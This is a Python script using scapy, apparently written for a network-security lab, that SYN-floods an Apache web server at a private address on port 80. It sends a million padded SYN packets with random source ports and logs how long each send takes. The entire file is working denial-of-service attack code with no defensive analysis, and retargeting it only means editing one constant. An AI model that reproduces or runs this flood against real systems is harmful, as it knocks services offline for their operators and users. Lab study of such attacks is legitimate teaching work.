from scapy.all import * 
import numpy as np
import time
import argparse

# Argument parser setup
parser = argparse.ArgumentParser(description="SYN Flood Attack Script")
parser.add_argument("--ineer", type=int, default=10000, help="Number of inner loops")
parser.add_argument("--outer", type=int, default=100, help="Number of outer loops")

args = parser.parse_args()


#Constants
INEER_LOOPS = args.ineer
OUTER_LOOPS = args.outer
TARGET_IP = "10.9.0.4"  #The target ip, the ip of the apache http server were attacking
TARGET_PORT = 80 #The target port, the port of the apache http server were attacking

#Function to send the packets
def attack():
    index_time = np.zeros((INEER_LOOPS*OUTER_LOOPS,2)) #List to store the index and time of each packet sent

    index = 0
    for i in range(OUTER_LOOPS): #Loop 100 times
        for j in range(INEER_LOOPS): #Loop 10000 times, overall sending 1 million packets
            ip = IP(dst=TARGET_IP) #The IP layer

            tcp = TCP(sport=RandShort(),dport= TARGET_PORT, flags="S") #The TCP layer, we set the source port to a random number, the destination port to the target port and the flags to S (SYN)

            raw = Raw(b"X"*1024) #Add additional data to the packet, to make it bigger

            p = ip/tcp/raw #Constuct the packet, layer by layer
            
            before = time.time() #Get the time before sending the packet
            send(p, loop=0, verbose=0) #Send the packet in a loop, verbose=0 to suppress output
            after = time.time()
            index_time[index] = [index, (after-before)*1000] #Store the index and the time took to send in ms
            index += 1
            
            if (j + 1) % 1000 == 0:  # Print after every 1000 iterations
                print(f"Sent {j + 1} packets in iteration {i + 1}")
                
    return index_time






        

if __name__ == '__main__':
    start = time.time() #Get the time before starting the attack
    index_time = attack() #Start the attack and get the time difference between each packet sent
    end = time.time() #Get the time after the attack has finished
    sum = 0
    with open('./syns_result_p.txt', 'w') as file: #Write the index and time difference to a file as requested
        for i in range(len(index_time)):
            time_diff = index_time[i]
            sum += time_diff[1]
            file.write(f"{i} {time_diff[1]}\n") #Write the index and time difference to the file
    print(f"Attack took {(end - start)*1000} ms") #Print the time taken for the attack to finish
    print(f"Attack took {sum} ms") #Print the time taken for the attack to finish
    



























